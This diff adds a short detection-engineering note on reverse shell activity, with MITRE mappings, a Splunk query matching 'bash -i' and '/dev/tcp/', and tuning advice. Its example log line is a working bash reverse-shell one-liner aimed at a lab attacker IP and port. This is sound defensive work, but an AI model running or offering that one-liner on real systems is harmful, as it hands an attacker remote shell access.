@@ -1,0 +1,24 @@
+🚨 Reverse Shell Detection
+📌 Objective
+
+Detect reverse shell activity from victim to attacker.
+
+🎯 MITRE Mapping
+T1059 (Command Execution)
+T1071 (C2 Communication)
+🔍 Detection Logic
+Outbound connection to uncommon port
+bash execution with network redirection
+💻 SPL Query
+index=* ("bash -i" OR "/dev/tcp/")
+| stats count by host, src_ip, dest_ip, dest_port
+📊 Example Log
+bash -i >& /dev/tcp/192.168.56.101/4444
+⚠️ False Positives
+admin scripts using bash networking
+⚙️ Tuning Strategy
+exclude known admin IPs
+monitor only unusual ports (>1024)
+🔥 Severity
+
+HIGH
